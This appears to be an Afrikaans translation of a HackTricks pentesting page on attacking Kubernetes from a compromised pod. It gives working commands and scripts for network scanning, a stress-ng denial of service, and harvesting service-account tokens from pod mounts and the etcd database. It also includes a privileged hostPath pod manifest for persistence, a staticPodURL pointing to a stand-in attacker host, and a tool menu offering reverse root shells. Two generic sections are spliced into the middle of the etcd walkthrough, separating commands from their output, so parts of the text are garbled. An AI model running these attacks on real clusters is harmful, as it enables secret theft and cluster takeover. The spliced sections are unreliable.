# Attacking Kubernetes from inside a Pod

## Aanval op Kubernetes van binne 'n Pod

<details>

<summary><strong>Leer AWS-hacking van nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy jou **maatskappy in HackTricks wil adverteer** of **HackTricks in PDF wil aflaai**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github-opslag.

</details>

### **Pod-ontsnapping**

**As jy gelukkig genoeg is, kan jy dalk daaruit ontsnap na die node:**

![](https://sickrov.github.io/media/Screenshot-161.jpg)

#### Ontsnapping uit die pod

Om te probeer ontsnap uit die pos, moet jy dalk eers **voorregte verhoog**, enkele tegnieke om dit te doen:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation" %}

Jy kan hierdie **docker-ontsnappings probeer** om te ontsnap uit 'n pod wat jy gekompromitteer het:

{% embed url="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/docker-breakout" %}

#### Misbruik van Kubernetes-voorregte

Soos verduidelik in die afdeling oor **kubernetes enumerasie**:

{% content-ref url="kubernetes-enumeration.md" %}
[kubernetes-enumeration.md](kubernetes-enumeration.md)
{% endcontent-ref %}

Gewoonlik word die pods uitgevoer met 'n **diensrekening-token** binne-in hulle. Hierdie diensrekening kan sekere **voorregte daaraan geheg** h√™ wat jy kan **misbruik** om na ander pods te **beweeg** of selfs om te **ontsnap** na die nodes wat binne die groep geconfigureer is. Kyk hoe in:

{% content-ref url="abusing-roles-clusterroles-in-kubernetes/" %}
[abusing-roles-clusterroles-in-kubernetes](abusing-roles-clusterroles-in-kubernetes/)
{% endcontent-ref %}

#### Misbruik van Cloud-voorregte

As die pod binne 'n **wolk-omgewing** uitgevoer word, kan jy dalk 'n token van die metadata-eindpunt **lek** en voorregte verhoog deur dit te gebruik.

### Soek kwesbare netwerkdienste

Aangesien jy binne die Kubernetes-omgewing is, as jy nie voorregte kan verhoog deur die huidige pod se voorregte te misbruik en jy nie uit die houer kan ontsnap nie, moet jy **potensieel kwesbare dienste soek.**

#### Dienste

**Vir hierdie doel kan jy probeer om al die dienste van die Kubernetes-omgewing te kry:**

```
kubectl get svc --all-namespaces
```

Standaard gebruik Kubernetes 'n plat netwerk skema, wat beteken **enige pod/diens binne die groep kan met ander kommunikeer**. Die **namespaces** binne die groep het **nie standaard enige netwerksekuriteitsbeperkings nie**. Enigeen in die namespace kan met ander namespaces kommunikeer.

#### Skandering

Die volgende Bash-skripsie (geneem van 'n [Kubernetes-werkswinkel](https://github.com/calinah/learn-by-hacking-kccn/blob/master/k8s\_cheatsheet.md)) sal die IP-reeks van die Kubernetes-groep installeer en skandeer:

```bash
sudo apt-get update
sudo apt-get install nmap
nmap-kube ()
{
nmap --open -T4 -A -v -Pn -p 80,443,2379,8080,9090,9100,9093,4001,6782-6784,6443,8443,9099,10250,10255,10256 "${@}"
}

nmap-kube-discover () {
local LOCAL_RANGE=$(ip a | awk '/eth0$/{print $2}' | sed 's,[0-9][0-9]*/.*,*,');
local SERVER_RANGES=" ";
SERVER_RANGES+="10.0.0.1 ";
SERVER_RANGES+="10.0.1.* ";
SERVER_RANGES+="10.*.0-1.* ";
nmap-kube ${SERVER_RANGES} "${LOCAL_RANGE}"
}
nmap-kube-discover
```

Kyk na die volgende bladsy om te leer hoe jy **Kubernetes-spesifieke dienste kan aanval** om **ander pods/die hele omgewing te kompromitteer**:

{% content-ref url="pentesting-kubernetes-services/" %}
[pentesting-kubernetes-services](pentesting-kubernetes-services/)
{% endcontent-ref %}

#### Sniffing

In die geval waar die **gekompromitteerde pod 'n sensitiewe diens uitvoer** waar ander pods moet verifieer, kan jy moontlik die geloofsbriewe verkry wat van die ander pods af gestuur word deur **lokale kommunikasie af te luister**.

### Netwerkvervalsing

Standaard werk tegnieke soos **ARP-vervalsing** (en dankie aan dit **DNS-vervalsing**) in die Kubernetes-netwerk. Dan, binne 'n pod, as jy die **NET\_RAW-vermo√´** het (wat standaard daar is), sal jy in staat wees om aangepaste vervaardigde netwerkpakette te stuur en **MitM-aanvalle uit te voer via ARP-vervalsing na al die pods wat op dieselfde nodus loop.**\
Verder, as die **boosaardige pod** op dieselfde nodus as die DNS-bediener loop, sal jy 'n **DNS-vervalsingsaanval op al die pods in die klasternetwerk kan uitvoer**.

{% content-ref url="kubernetes-network-attacks.md" %}
[kubernetes-network-attacks.md](kubernetes-network-attacks.md)
{% endcontent-ref %}

### Nodus DoS

Daar is geen spesifikasie van hulpbronne in die Kubernetes-manifeste en **geen toegepaste limiet**-reekse vir die houers nie. As 'n aanvaller kan ons **alle hulpbronne waar die pod/uitrol loop, verbruik** en ander hulpbronne uithonger en 'n DoS vir die omgewing veroorsaak.

Dit kan gedoen word met 'n instrument soos [**stress-ng**](https://zoomadmin.com/HowToInstall/UbuntuPackage/stress-ng):

```
stress-ng --vm 2 --vm-bytes 2G --timeout 30s
```

Jy kan die verskil sien terwyl jy `stress-ng` uitvoer en daarna.

```bash
kubectl --namespace big-monolith top pod hunger-check-deployment-xxxxxxxxxx-xxxxx
```

### Node Post-Exploitasie

As jy daarin geslaag het om **uit die houer te ontsnap**, sal jy interessante dinge in die node vind:

* Die **Houer Runtime**-proses (Docker)
* Meer **pods/houers** wat op die node loop en wat jy kan misbruik (meer tokens)
* Die hele **l√™ersisteem** en **bedryfstelsel** in die algemeen
* Die **Kube-Proxy**-diens wat luister
* Die **Kubelet**-diens wat luister. Kontroleer konfigurasie-l√™ers:
* Gids: `/var/lib/kubelet/`
* `/var/lib/kubelet/kubeconfig`
* `/var/lib/kubelet/kubelet.conf`
* `/var/lib/kubelet/config.yaml`
* `/var/lib/kubelet/kubeadm-flags.env`
* `/etc/kubernetes/kubelet-kubeconfig`
* Ander **kubernetes algemene l√™ers**:
* `$HOME/.kube/config` - **Gebruiker-konfigurasie**
* `/etc/kubernetes/kubelet.conf`- **Gewone konfigurasie**
* `/etc/kubernetes/bootstrap-kubelet.conf` - **Bootstrap-konfigurasie**
* `/etc/kubernetes/manifests/etcd.yaml` - **etcd-konfigurasie**
* `/etc/kubernetes/pki` - **Kubernetes-sleutel**

#### Vind node kubeconfig

As jy nie die kubeconfig-l√™er in een van die vorige genoemde paaie kan vind nie, **kontroleer die argument `--kubeconfig` van die kubelet-proses**:

```
ps -ef | grep kubelet
root        1406       1  9 11:55 ?        00:34:57 kubelet --cloud-provider=aws --cni-bin-dir=/opt/cni/bin --cni-conf-dir=/etc/cni/net.d --config=/etc/kubernetes/kubelet-conf.json --exit-on-lock-contention --kubeconfig=/etc/kubernetes/kubelet-kubeconfig --lock-file=/var/run/lock/kubelet.lock --network-plugin=cni --container-runtime docker --node-labels=node.kubernetes.io/role=k8sworker --volume-plugin-dir=/var/lib/kubelet/volumeplugin --node-ip 10.1.1.1 --hostname-override ip-1-1-1-1.eu-west-2.compute.internal
```

#### Steel Geheime

Om geheime te steel, kan jy die volgende metodes gebruik:

**1. Bestandstoegang**

As jy toegang het tot die bestandstelsel binne 'n pod, kan jy soek na l√™ers wat geheime bevat. Jy kan die volgende plekke ondersoek:

* `/var/run/secrets/kubernetes.io/serviceaccount/`: Hierdie plek bevat die standaard diensrekening se geheime, soos die toegangstokens en die CA-sertifikaat.
* `/var/run/secrets/`: Hier kan jy ander geheime vind wat deur die pod gebruik word.

**2. Omgewingsveranderlikes**

Jy kan ook die omgewingsveranderlikes van die pod ondersoek om geheime te vind. Voer die volgende opdrag uit binne die pod:

```bash
env
```

Dit sal 'n lys van omgewingsveranderlikes toon, wat moontlik geheime kan bevat.

**3. API-aanroep**

As jy toegang het tot die Kubernetes API binne die pod, kan jy die API aanroep om geheime te bekom. Jy kan die volgende opdrag gebruik:

```bash
curl -k -H "Authorization: Bearer <TOKEN>" https://kubernetes.default.svc/api/v1/namespaces/<NAMESPACE>/secrets
```

Vervang `<TOKEN>` met die toegangstoken van die pod en `<NAMESPACE>` met die naam van die namespace waarin die pod bestaan. Hierdie opdrag sal 'n lys van geheime in die betrokke namespace gee.

**4. Ander aanvalsmetodes**

Daar is ook ander aanvalsmetodes wat jy kan gebruik om geheime te steel, soos die gebruik van 'n kwaadwillige beeld of die uitvoering van 'n kwaadwillige kode binne die pod. Hierdie metodes is egter meer gevorderd en vereis 'n dieper begrip van Kubernetes sekerheid.

```bash
# Check Kubelet privileges
kubectl --kubeconfig /var/lib/kubelet/kubeconfig auth can-i create pod -n kube-system

# Steal the tokens from the pods running in the node
# The most interesting one is probably the one of kube-system
ALREADY="IinItialVaaluE"
for i in $(mount | sed -n '/secret/ s/^tmpfs on \(.*default.*\) type tmpfs.*$/\1\/namespace/p'); do
TOKEN=$(cat $(echo $i | sed 's/.namespace$/\/token/'))
if ! [ $(echo $TOKEN | grep -E $ALREADY) ]; then
ALREADY="$ALREADY|$TOKEN"
echo "Directory: $i"
echo "Namespace: $(cat $i)"
echo ""
echo $TOKEN
echo "================================================================================"
echo ""
fi
done
```

Die skrip [**can-they.sh**](https://github.com/BishopFox/badPods/blob/main/scripts/can-they.sh) sal outomaties **die tokens van ander pods kry en nagaan of hulle die toestemming het** wat jy soek (in plaas daarvan dat jy een vir een kyk):

```bash
./can-they.sh -i "--list -n default"
./can-they.sh -i "list secrets -n kube-system"// Some code
```

#### Bevoorregte DaemonSets

'n DaemonSet is 'n **pod** wat in **alle nodus van die groep** uitgevoer sal word. Daarom, as 'n DaemonSet gekonfigureer is met 'n **voorregte diensrekening**, sal jy in **ALLE nodus** die **token** van daardie **voorregte diensrekening** kan vind wat jy kan misbruik.

Die uitbuiting is dieselfde as in die vorige afdeling, maar jy hang nou nie af van geluk nie.

#### Pivoteer na die Wolk

As die groep deur 'n wolkdiens bestuur word, sal die **Nodus 'n ander toegang tot die metadata-eindpunt h√™** as die Pod. Probeer dus om **toegang tot die metadata-eindpunt vanaf die nodus** (of vanaf 'n pod met hostNetwork op True) te verkry:

{% content-ref url="kubernetes-pivoting-to-clouds.md" %}
[kubernetes-pivoting-to-clouds.md](kubernetes-pivoting-to-clouds.md)
{% endcontent-ref %}

#### Steel etcd

As jy die [**nodeName**](https://kubernetes.io/docs/tasks/configure-pod-container/assign-pods-nodes/#create-a-pod-that-gets-scheduled-to-specific-node) van die Nodus wat die houer sal uitvoer, kan spesifiseer, kry 'n skul in 'n beheervlak-nodus en kry die **etcd-databasis**:

```
kubectl get nodes
NAME                STATUS   ROLES    AGE   VERSION
k8s-control-plane   Ready    master   93d   v1.19.1
k8s-worker          Ready    <none>   93d   v1.19.1
```

beheer-vlak-nodes het die **rol meester** en in **wolk-bestuurde groepe sal jy nie in staat wees om iets daarin uit te voer nie**.

**Lees geheime van etcd**

As jy jou houer op 'n beheer-vlak node kan hardloop deur die `nodeName` selekteerder in die houer spesifikasie te gebruik, kan jy maklik toegang tot die `etcd` databasis h√™, wat al die konfigurasie vir die groep bevat, insluitend alle geheime.

Hieronder is 'n vinnige en vuil manier om geheime van `etcd` te gryp as dit op die beheer-vlak node waarop jy is, hardloop. As jy 'n meer elegante oplossing wil h√™ wat 'n houer met die `etcd` kli√´ntnut `etcdctl` opspin en die beheer-vlak node se geloofsbriewe gebruik om met etcd waar dit ook al hardloop, te verbind, kyk na [hierdie voorbeeld manifest](https://github.com/mauilion/blackhat-2019/blob/master/etcd-attack/etcdclient.yaml) van @mauilion.

**Kyk of `etcd` op die beheer-vlak node hardloop en sien waar die databasis is (Dit is op 'n `kubeadm` geskepde groep)**

```
root@k8s-control-plane:/var/lib/etcd/member/wal# ps -ef | grep etcd | sed s/\-\-/\\n/g | grep data-dir
```

## Aanval op Kubernetes vanuit 'n Pod

In 'n Kubernetes-omgewing kan 'n aanvaller wat toegang het tot 'n pod, probeer om toegang te verkry tot die Kubernetes-stelsel self. Hier is 'n paar tegnieke wat gebruik kan word om hierdie aanval uit te voer:

### 1. Gebruik van die Kubernetes API

Die Kubernetes API bied 'n ryk stel funksies en eindpunte wat gebruik kan word om die Kubernetes-stelsel te manipuleer. 'n Aanvaller kan die API gebruik om pod-inligting te bekom, pod-status te verander, nuwe pods te skep, en selfs die hele Kubernetes-stelsel te beheer.

### 2. Gebruik van die Kubernetes-konfigurasie

As 'n aanvaller toegang het tot die konfigurasie van die pod, kan hy of sy die konfigurasie wysig om toegang te verkry tot die Kubernetes-stelsel. Byvoorbeeld, deur die konfigurasie van die pod te wysig om 'n ander diensrekening te gebruik, kan die aanvaller toegang verkry tot die Kubernetes API met die regte van daardie diensrekening.

### 3. Gebruik van omgewingsveranderlikes

Omgewingsveranderlikes in 'n pod kan gebruik word om toegang te verkry tot die Kubernetes-stelsel. Byvoorbeeld, as 'n pod 'n omgewingsveranderlike bevat wat die toegangstokens vir die Kubernetes API bevat, kan 'n aanvaller hierdie veranderlike gebruik om toegang te verkry tot die API.

### 4. Gebruik van volume-aanvalle

As 'n pod toegang het tot 'n gedeelde volume wat gebruik word deur ander pods, kan 'n aanvaller die volume gebruik om toegang te verkry tot die konfigurasie van ander pods. Byvoorbeeld, as 'n pod 'n volume deel met 'n pod wat toegang het tot die Kubernetes-konfigurasie, kan 'n aanvaller die volume gebruik om die konfigurasie te lees en te wysig.

### 5. Gebruik van netwerkverkeer

As 'n pod netwerkverkeer kan onderskep, kan 'n aanvaller die verkeer analiseer om inligting oor die Kubernetes-stelsel te bekom. Byvoorbeeld, deur die netwerkverkeer tussen pods te onderskep, kan 'n aanvaller pod-inligting, API-aanroepverkeer en ander sensitiewe inligting verkry.

Dit is belangrik om hierdie aanvalstegnieke te verstaan en te beskerm teen moontlike aanvalle. Deur die nodige veiligheidsmaatre√´ls te implementeer, kan 'n Kubernetes-omgewing beskerm word teen aanvalle vanuit pods.

```bash
data-dir=/var/lib/etcd
```

**Sien die data in die etcd-databasis:**

```bash
kubectl exec -it <pod-name> -- sh
ETCDCTL_API=3 etcdctl get --prefix "" --keys-only --from-key / --cacert /var/run/secrets/kubernetes.io/serviceaccount/ca.crt --cert /var/run/secrets/kubernetes.io/serviceaccount/tls.crt --key /var/run/secrets/kubernetes.io/serviceaccount/tls.key | grep -v '\/$'
```

Hierdie bevel sal jou in staat stel om die data in die etcd-databasis te sien. Vervang `<pod-name>` met die naam van die pod waarin jy wil inbreek.

```bash
strings /var/lib/etcd/member/snap/db | less
```

**Haal die tokens uit die databasis en wys die diensrekening se naam**

```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done
```

**Dieselfde bevel, maar met 'n paar greps om slegs die verstek-token in die kube-system-namespace terug te gee**

```bash
db=`strings /var/lib/etcd/member/snap/db`; for x in `echo "$db" | grep eyJhbGciOiJ`; do name=`echo "$db" | grep $x -B40 | grep registry`; echo $name \| $x; echo; done | grep kube-system | grep default
```

## Aanval op Kubernetes vanuit 'n Pod

In 'n Kubernetes-omgewing kan 'n aanvaller wat toegang het tot 'n pod, probeer om toegang te verkry tot ander pods of selfs die hele Kubernetes-stelsel. Hier is 'n paar tegnieke wat gebruik kan word om 'n aanval van binne 'n pod uit te voer:

### 1. API-toegang

As 'n pod toegang het tot die Kubernetes API, kan 'n aanvaller dit gebruik om inligting oor die stelsel te bekom, pods te skep of te verwyder, en selfs die hele stelsel te manipuleer. Dit kan gedoen word deur die gebruik van 'n Kubernetes-konfigurasie-l√™er wat API-toegang verleen, soos 'n diensrekening of 'n konfigmap.

### 2. Kubelet-toegang

Die kubelet is die agtergrondproses wat verantwoordelik is vir die bestuur van pods op 'n enkele werker. As 'n pod toegang het tot die kubelet, kan 'n aanvaller dit gebruik om inligting oor ander pods op dieselfde werker te bekom, pod-konfigurasie te manipuleer of selfs die kubelet self aan te val.

### 3. Netwerktoegang

As 'n pod netwerktoegang het tot ander pods of stelselkomponente, kan 'n aanvaller dit gebruik om verkeer te onderskep, te manipuleer of selfs aanvalle uit te voer teen ander pods of stelselkomponente. Dit kan gedoen word deur die gebruik van netwerktoerusting binne die pod, soos 'n sniffer of 'n proxy.

### 4. Bestandstoegang

As 'n pod toegang het tot die l√™ersisteem van die werker of ander pods, kan 'n aanvaller dit gebruik om inligting te lek, kwaadwillige l√™ers te skep of selfs die l√™ersisteem van die werker te manipuleer. Dit kan gedoen word deur die gebruik van l√™eroperasies binne die pod, soos lees, skryf of uitvoer.

### 5. Omgewingsveranderlikes

As 'n pod toegang het tot omgewingsveranderlikes, kan 'n aanvaller dit gebruik om inligting oor die stelsel of ander pods te bekom, of selfs die gedrag van die pod te manipuleer. Dit kan gedoen word deur die gebruik van omgewingsveranderlikes binne die pod, soos omgewingsveranderlikes wat API-toegangsinligting bevat.

### 6. Geheuelek

As 'n pod toegang het tot die geheue van die werker of ander pods, kan 'n aanvaller dit gebruik om inligting te lek, geheuelek te skep of selfs die geheue van die werker te manipuleer. Dit kan gedoen word deur die gebruik van geheueoperasies binne die pod, soos lees, skryf of uitvoer.

### 7. Privilege Escalation

As 'n pod toegang het tot 'n beperkte rekening binne die pod, kan 'n aanvaller dit gebruik om bevoorregte toegang te verkry en sodoende die pod of die hele stelsel te manipuleer. Dit kan gedoen word deur die gebruik van bekende bevoorregte eskalasietegnieke, soos die gebruik van SUID-bin√™re l√™ers of die uitbuiting van bekende kwesbaarhede.

### 8. Side-Channel Attacks

As 'n pod toegang het tot 'n gedeelde hulpbron, soos 'n CPU of 'n geheuebus, kan 'n aanvaller dit gebruik om inligting te lek deur side-channel-aanvalle uit te voer. Dit kan gedoen word deur die gebruik van tegnieke soos cache-timing-aanvalle of geheuelek-aanvalle.

### 9. Container Breakout

As 'n pod toegang het tot 'n beperkte kontainer binne die pod, kan 'n aanvaller dit gebruik om uit die kontainer te ontsnap en toegang te verkry tot die werker of ander pods. Dit kan gedoen word deur die gebruik van bekende kontainerontsnappingsmetodes, soos die uitbuiting van bekende kwesbaarhede in die kontainer-runtime of die manipulasie van die kontaineromgewing.

### 10. Social Engineering

As 'n pod toegang het tot 'n menslike gebruiker binne die pod, kan 'n aanvaller dit gebruik om sosiale ingenieurswese-aanvalle uit te voer en sodoende inligting te bekom of aksies namens die gebruiker uit te voer. Dit kan gedoen word deur die gebruik van sosiale ingenieurswese-tegnieke, soos phising, vishing of pretexting.

Dit is belangrik om hierdie aanvalstegnieke te verstaan en gepaste maatre√´ls te tref om die veiligheid van 'n Kubernetes-omgewing te verseker.

```
1/registry/secrets/kube-system/default-token-d82kb | eyJhbGciOiJSUzI1NiIsImtpZCI6IkplRTc0X2ZP[REDACTED]
```

#### Statische/Gespie√´lde Pods Volharding

_Statische Pods_ word direk deur die kubelet daemon op 'n spesifieke node bestuur, sonder dat die API-bediener dit waarneem. In teenstelling met Pods wat deur die beheervlak bestuur word (byvoorbeeld 'n Implementering); in plaas daarvan **kyk die kubelet na elke statiese Pod** (en herbegin dit as dit misluk).

Daarom is statiese Pods altyd **gekoppel aan een Kubelet** op 'n spesifieke node.

Die **kubelet probeer outomaties 'n spie√´l-Pod op die Kubernetes API-bediener skep** vir elke statiese Pod. Dit beteken dat die Pods wat op 'n node loop, sigbaar is op die API-bediener, maar nie van daar af beheer kan word nie. Die Pod-name sal gesuffix word met die nodenaam met 'n voorafgaande koppelteken.

{% hint style="danger" %}
Die **`spec` van 'n statiese Pod kan nie na ander API-voorwerpe verwys nie** (byvoorbeeld ServiceAccount, ConfigMap, Secret, ens. Jy kan dus nie hierdie gedrag misbruik om 'n pod met 'n willekeurige serviceAccount te begin nie in die huidige node om die cluster te kompromitteer. Maar jy kan dit gebruik om pods in verskillende namespaces te laat loop (as dit nuttig is vir 'n bepaalde rede).
{% endhint %}

As jy binne die nodenaam is, kan jy dit laat skep **'n statiese pod binne homself**. Dit is baie nuttig omdat dit jou mag toelaat om **'n pod in 'n ander namespace** soos **kube-system** te skep.

Om 'n statiese pod te skep, is die [**dokumentasie 'n groot hulp**](https://kubernetes.io/docs/tasks/configure-pod-container/static-pod/). Jy het basies 2 dinge nodig:

* Stel die parameter **`--pod-manifest-path=/etc/kubernetes/manifests`** in die **kubelet-diens** of in die **kubelet-konfigurasie** ([**staticPodPath**](https://kubernetes.io/docs/reference/config-api/kubelet-config.v1beta1/#kubelet-config-k8s-io-v1beta1-KubeletConfiguration)) en herbegin die diens
* Skep die definisie op die **pod-definisie** in **`/etc/kubernetes/manifests`**

**'n Ander meer heimlike manier sou wees om:**

* Wysig die parameter **`staticPodURL`** van die **kubelet**-konfigurasie-l√™er en stel iets soos `staticPodURL: http://aanvaller.com:8765/pod.yaml` in. Dit sal die kubelet-proses laat 'n **statiese pod** skep wat die **konfigurasie vanaf die aangeduide URL** kry.

**Voorbeeld** van **pod**-konfigurasie om 'n voorregpod in **kube-system** te skep, geneem vanaf [**hier**](https://research.nccgroup.com/2020/02/12/command-and-kubectl-talk-follow-up/):

```yaml
apiVersion: v1
kind: Pod
metadata:
name: bad-priv2
namespace: kube-system
spec:
containers:
- name: bad
hostPID: true
image: gcr.io/shmoocon-talk-hacking/brick
stdin: true
tty: true
imagePullPolicy: IfNotPresent
volumeMounts:
- mountPath: /chroot
name: host
securityContext:
privileged: true
volumes:
- name: host
hostPath:
path: /
type: Directory
```

#### Verwyder pods + onskeduleerbare nodes

As 'n aanvaller 'n **node gekompromitteer** het en hy kan **pods verwyder** vanaf ander nodes en **ander nodes nie in staat stel om pods uit te voer nie**, sal die pods herlaai word in die gekompromitteerde node en sal hy in staat wees om die tokens wat in hulle loop, **te steel**.\
Vir [**meer inligting volg hierdie skakels**](abusing-roles-clusterroles-in-kubernetes/#delete-pods-+-unschedulable-nodes).

### Outomatiese Gereedskap

* [**https://github.com/inguardians/peirates**](https://github.com/inguardians/peirates)

```
Peirates v1.1.8-beta by InGuardians
https://www.inguardians.com/peirates
----------------------------------------------------------------
[+] Service Account Loaded: Pod ns::dashboard-56755cd6c9-n8zt9
[+] Certificate Authority Certificate: true
[+] Kubernetes API Server: https://10.116.0.1:443
[+] Current hostname/pod name: dashboard-56755cd6c9-n8zt9
[+] Current namespace: prd
----------------------------------------------------------------
Namespaces, Service Accounts and Roles |
---------------------------------------+
[1] List, maintain, or switch service account contexts [sa-menu]  (try: listsa *, switchsa)
[2] List and/or change namespaces [ns-menu] (try: listns, switchns)
[3] Get list of pods in current namespace [list-pods]
[4] Get complete info on all pods (json) [dump-pod-info]
[5] Check all pods for volume mounts [find-volume-mounts]
[6] Enter AWS IAM credentials manually [enter-aws-credentials]
[7] Attempt to Assume a Different AWS Role [aws-assume-role]
[8] Deactivate assumed AWS role [aws-empty-assumed-role]
[9] Switch authentication contexts: certificate-based authentication (kubelet, kubeproxy, manually-entered) [cert-menu]
-------------------------+
Steal Service Accounts   |
-------------------------+
[10] List secrets in this namespace from API server [list-secrets]
[11] Get a service account token from a secret [secret-to-sa]
[12] Request IAM credentials from AWS Metadata API [get-aws-token] *
[13] Request IAM credentials from GCP Metadata API [get-gcp-token] *
[14] Request kube-env from GCP Metadata API [attack-kube-env-gcp]
[15] Pull Kubernetes service account tokens from kops' GCS bucket (Google Cloudonly) [attack-kops-gcs-1]  *
[16] Pull Kubernetes service account tokens from kops' S3 bucket (AWS only) [attack-kops-aws-1]
--------------------------------+
Interrogate/Abuse Cloud API's   |
--------------------------------+
[17] List AWS S3 Buckets accessible (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls]
[18] List contents of an AWS S3 Bucket (Make sure to get credentials via get-aws-token or enter manually) [aws-s3-ls-objects]
-----------+
Compromise |
-----------+
[20] Gain a reverse rootshell on a node by launching a hostPath-mounting pod [attack-pod-hostpath-mount]
[21] Run command in one or all pods in this namespace via the API Server [exec-via-api]
[22] Run a token-dumping command in all pods via Kubelets (authorization permitting) [exec-via-kubelet]
-------------+
Node Attacks |
-------------+
[30] Steal secrets from the node filesystem [nodefs-steal-secrets]
-----------------+
Off-Menu         +
-----------------+
[90] Run a kubectl command using the current authorization context [kubectl [arguments]]
[] Run a kubectl command using EVERY authorization context until one works [kubectl-try-all [arguments]]
[91] Make an HTTP request (GET or POST) to a user-specified URL [curl]
[92] Deactivate "auth can-i" checking before attempting actions [set-auth-can-i]
[93] Run a simple all-ports TCP port scan against an IP address [tcpscan]
[94] Enumerate services via DNS [enumerate-dns] *
[]  Run a shell command [shell <command and arguments>]

[exit] Exit Peirates
```

* [**https://github.com/r0binak/MTKPI**](https://github.com/r0binak/MTKPI)

<details>

<summary><strong>Leer AWS-hacking vanaf nul tot held met</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Ander maniere om HackTricks te ondersteun:

* As jy wil sien dat jou **maatskappy geadverteer word in HackTricks** of **HackTricks aflaai in PDF-formaat**, kyk na die [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Kry die [**amptelike PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Ontdek [**The PEASS Family**](https://opensea.io/collection/the-peass-family), ons versameling eksklusiewe [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Sluit aan by die** üí¨ [**Discord-groep**](https://discord.gg/hRep4RUj7f) of die [**telegram-groep**](https://t.me/peass) of **volg** my op **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Deel jou hacking-truuks deur PR's in te dien by die** [**HackTricks**](https://github.com/carlospolop/hacktricks) en [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub-opslagplekke.

</details>
